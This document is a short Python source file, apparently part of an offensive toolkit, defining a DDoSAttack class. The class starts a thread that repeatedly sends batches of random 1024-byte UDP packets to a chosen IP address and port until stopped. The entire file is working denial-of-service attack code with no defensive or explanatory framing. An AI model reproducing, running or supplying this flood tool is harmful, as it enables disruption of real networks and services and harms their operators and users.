# === FILE: core/ddos.py ===
import threading
import socket
import random

class DDoSAttack:
    def __init__(self, target_ip, target_port, packet_count=1000):
        self.target_ip = target_ip
        self.target_port = int(target_port)
        self.packet_count = int(packet_count)
        self.running = False

    def start_attack(self):
        self.running = True
        thread = threading.Thread(target=self._attack_loop)
        thread.start()
        return thread

    def stop_attack(self):
        self.running = False

    def _attack_loop(self):
        print(f"[+] Starting DDoS attack on {self.target_ip}:{self.target_port}")
        try:
            while self.running:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                bytes_data = random._urandom(1024)
                for _ in range(self.packet_count):
                    sock.sendto(bytes_data, (self.target_ip, self.target_port))
                sock.close()
        except Exception as e:
            print(f"[!] Error: {e}")
